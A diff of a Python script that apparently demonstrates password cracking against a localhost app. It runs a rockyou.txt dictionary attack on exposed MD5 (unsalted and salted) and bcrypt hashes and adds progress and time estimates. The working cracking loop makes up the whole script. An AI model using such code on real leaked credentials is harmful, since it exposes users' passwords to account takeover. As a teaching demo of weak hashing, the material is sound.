@@ -5,14 +5,14 @@ import requests
 import time
 
 target_url = "http://localhost:5000/users.js"
-print("\nHashing algorithms to demonstrate password extraction with:\n1: md5 unsalted\n2: md5 salted\n3: bcrypt")
+print("\nChoose a hashing algorithm to demonstrate password extraction:\n1: MD5 (unsalted)\n2: MD5 (salted)\n3: bcrypt")
 option = input("Enter option: ")
 if option == '1':
     hash_type = "pwd_hash_md5_unsalted"
-    hash_type_str = "md5 unsalted"
+    hash_type_str = "MD5 (unsalted)"
 elif option == '2':
     hash_type = "pwd_hash_md5_salted"
-    hash_type_str = "md5 salted"
+    hash_type_str = "MD5 (salted)"
 else:
     option = '3'
     hash_type = "pwd_hash_bcrypt"
@@ -32,6 +32,8 @@ print(f"\nHashing algorithm: {hash_type_str}")
 print("\nExposed hashes:")
 for hash_ in exposed_hashes_set:
     print(f"\t{hash_}" if option == '3' else f"\t'{hash_}'")
+total_exposed_hashes = len(exposed_hashes_set)  # for time estimates (bcrypt)
+cracked_exposed_hashes = total_exposed_hashes   # for tracking
 
 # read passwords from rockyou.txt & store them in rockyou_pwds
 rockyou_file = "rockyou.txt"
@@ -47,51 +49,90 @@ for raw_pwd in rockyou_pwds_raw:
     pwd_clean = raw_pwd.rstrip()  # remove trailing newline character
     pwd_to_bytes = pwd_clean.encode('utf-8')  # convert password to array of bytes
     rockyou_pwds.append(pwd_to_bytes)
+total_passwords = len(rockyou_pwds)     # to use for time estimates
 
-if option == '1':
+if option == '1':   # md5 unsalted
     # generate hash from passwords in rockyou.txt & compare against leaked hashes
     for pwd in rockyou_pwds:
         hash_md5_unsalted = hashlib.md5(pwd).hexdigest()   # generate hash
         if hash_md5_unsalted in exposed_hashes_set:
             print(f"\tSuccess! Matching hash found: '{hash_md5_unsalted}', Password: '{pwd.decode('utf-8')}'")
-            exposed_hashes_set.remove(hash_md5_unsalted)
-            if not exposed_hashes_set:
+            cracked_exposed_hashes -= 1
+            if cracked_exposed_hashes == 0:
                 break
 
-elif option == '2':
+elif option == '2':     # md5 salted
+    total_combinations_1byte = 256    # 2^8 possible combinations
+    iterations_const = 10000000
+    total_comparisons = total_passwords * total_combinations_1byte
+    pwd_count = 0
+    start_lap = time.time()
+
     # generate a salt from all possible combinations in 1 byte
-    for salt_int in range(255):   # 256 = 2^8
+    for salt_int in range(total_combinations_1byte):
         salt = salt_int.to_bytes(1, "big")    # convert to byte
         print(f"Trying salt: {salt}")     # show encoded to trace progress
 
-        # create hash from salt + rockyou passwords & compare
+        # create hash from each salt + every rockyou password & compare
         for pwd in rockyou_pwds:
+            pwd_count += 1
+
+            if pwd_count % iterations_const == 0:
+                # show estimated completion time based on rolling avg
+                current_time = time.time()
+                elapsed_time = current_time - start_lap
+                start_lap = current_time   # update for next iteration
+
+                current_rate = iterations_const / elapsed_time
+                remaining_pwds = total_comparisons - pwd_count
+                time_estimate_mins = remaining_pwds / (current_rate * 60)
+                print(f"Passwords tried: {pwd_count}. Estimated time left (mins): {time_estimate_mins:.2f}")
+
             hash_md5_salted = hashlib.md5(salt + pwd).hexdigest()  # generate hash
             if hash_md5_salted in exposed_hashes_set:
                 print(f"\tSuccess! Hash cracked: '{hash_md5_salted}', Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
-                exposed_hashes_set.remove(hash_md5_salted)
-                if not exposed_hashes_set:
+                cracked_exposed_hashes -= 1
+                if cracked_exposed_hashes == 0:
                     break
-        if not exposed_hashes_set:
+
+        if cracked_exposed_hashes == 0:
             break
-else:
-    total_passwords = len(rockyou_pwds)
+
+else:   # bcrypt
+    iterations_const = 50   # constant to check time rate against
     # iterate over each exposed hash
     for exposed_hash in exposed_hashes_set:
-        print(f"Trying hash: {exposed_hash}")  # show hash to trace progress
+        print(f"Trying exposed hash: {exposed_hash}")  # show current hash
+        total_exposed_hashes -= 1
 
         # compare each rockyou password against exposed hash
         pwd_count = 0
-        start_time = time.time()
+        start_lap = time.time()
+
         for pwd in rockyou_pwds:
             pwd_count += 1
-            if pwd_count % 100 == 0:
-                # show estimated completion time based on total avg
-                elapsed_time = time.time() - start_time
-                time_estimate_hrs = ((elapsed_time/pwd_count) * (total_passwords-pwd_count)) / 3600
-                print(f"Passwords tried: {pwd_count}. Estimated time left (hrs) for this hash: {time_estimate_hrs:.2f}")
-            hash_match = bcrypt.checkpw(pwd, exposed_hash)  # check match
-            if hash_match:
-                salt = exposed_hash[:29]
+
+            if pwd_count % iterations_const == 0:
+                # show estimated completion time based on rolling avg
+                current_time = time.time()
+                elapsed_time = current_time - start_lap
+                start_lap = current_time   # update for next iteration
+
+                current_rate = iterations_const / elapsed_time
+                remaining_pwds = total_passwords - pwd_count
+                time_estimate_hrs = remaining_pwds / (current_rate * 3600)
+                print(f"Passwords tried: {pwd_count}. "
+                      f"Estimated remaining time for this hash: {time_estimate_hrs:.2f} hours. ", end='')
+                print(f"Exposed hashes left: {total_exposed_hashes}"
+                      if total_exposed_hashes > 0 else "Trying last exposed hash.")
+
+            if bcrypt.checkpw(pwd, exposed_hash):   # check match
+                salt = exposed_hash[:29]    # salt is first 29 characters in hash
                 print(f"\tSuccess! Hash cracked: {exposed_hash}, Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
+                cracked_exposed_hashes -= 1
                 break
+
+if cracked_exposed_hashes == 0:
+    print("\nAll hashes were succesfully cracked.")
+else:
+    print(f"\nUnable to crack {cracked_exposed_hashes} {'hashes' if cracked_exposed_hashes > 1 else 'hash'}.")
